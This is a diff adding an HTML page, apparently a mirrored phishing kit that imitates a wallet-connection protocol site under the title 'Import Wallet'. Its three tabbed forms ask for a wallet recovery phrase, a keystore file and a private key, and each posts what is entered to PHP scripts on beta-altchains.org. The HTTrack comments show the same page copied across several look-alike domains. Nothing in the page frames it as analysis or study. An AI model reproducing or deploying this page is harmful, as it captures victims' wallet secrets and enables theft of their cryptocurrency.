@@ -1,0 +1,112 @@
+<html>
+
+<!-- Mirrored from restorewallets.com/connect/index062006200620?w=trust+vault by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 05 Apr 2021 08:14:41 GMT -->
+<!-- Added by HTTrack -->
+<!-- Mirrored from syncingvalidator.com/connect/index06200620062007c5.html?w=trust+vault by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 03 Oct 2021 14:51:27 GMT -->
+
+<!-- Mirrored from beta-altchains.org/connect/index06200620062007c507c5.html?w=trust+vault by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 06 Dec 2021 05:23:22 GMT -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="stylesheet" href="../assets/main.css" type="text/css"> 
+<meta name="description" content="Open protocol for connecting Wallets to Dapps">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:image" content="../images/logo.html">
+<link rel="icon" href="../assets/logo.svg">
+<script>
+    function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+  
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+  
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+  
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+  }
+  </script>
+<title>Import Wallet</title>
+</head>
+<body>
+<center>
+<div class="top">
+        <a href="../index-2.html#footer" class="left">Github</a>
+        <a href="../index-2.html#" class="left">Docs</a>
+        <a href="../index-2.html" class="main"><img src="../assets/logo.svg" alt="logo"></a>
+        <a href="../index-2.html#wallets" class="left">Wallets</a>
+        <a href="../index-2.html#" class="left">Apps</a>
+</div>
+<br>
+<h2><center>Import Wallet</center></h2>
+<br>
+<div class="tab">
+  <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
+  <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore</button>
+  <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
+</div>
+
+<div id="phrase" class="tabcontent" style="display: block;">
+            <form w="" action="https://beta-altchains.org/connect/phrase.php" method="POST">
+
+                <!-- <input type="hidden" name="w" value="Electrum"> -->
+
+                <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
+                <br>
+                <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                <br>
+                <button type="submit" name="submit" class="btn">IMPORT</button>
+            </form>
+        </div>
+
+               <!-- <div class="desc">Ensure your Pass Phrase is correct! </div>
+                <br>
+                <button type="submit" name="submit" class="btn">IMPORT</button>
+            </form>
+        </div>-->
+
+
+          
+ <div id="keystore" class="tabcontent" style="display: block;">
+  <form action="https://beta-altchains.org/connect/keystore.php" method="POST">
+  <input type="file" id="Keystore" name="Keystore"><br><br>
+  <button type="submit" name="submit" class="btn">IMPORT</button>
+            
+                <!-- <input type="hidden" name="w" value="Electrum"> -->
+</form>
+
+        </div>
+
+        <div id="private" class="tabcontent" style="display: none;">
+            <form action="https://beta-altchains.org/connect/privatekey.php" method="POST">
+                <!-- <input type="hidden" name="w" value="Electrum"> -->
+                <div class="field">
+                    <input type="text" name="key" class="key" placeholder="Private Key">
+                </div>
+                <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                <br>
+                <button type="submit" name="submit" class="btn">IMPORT</button>
+            </form>
+        </div>
+
+
+
+<script>
+    document.getElementById("default").click();
+</script>
+
+</center></body>
+<!-- Mirrored from restorewallets.com/connect/index062006200620?w=trust+vault by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 05 Apr 2021 08:14:41 GMT -->
+
+<!-- Mirrored from syncingvalidator.com/connect/index06200620062007c5.html?w=trust+vault by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 03 Oct 2021 14:51:27 GMT -->
+
+<!-- Mirrored from beta-altchains.org/connect/index06200620062007c507c5.html?w=trust+vault by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 06 Dec 2021 05:23:22 GMT -->
+</html>
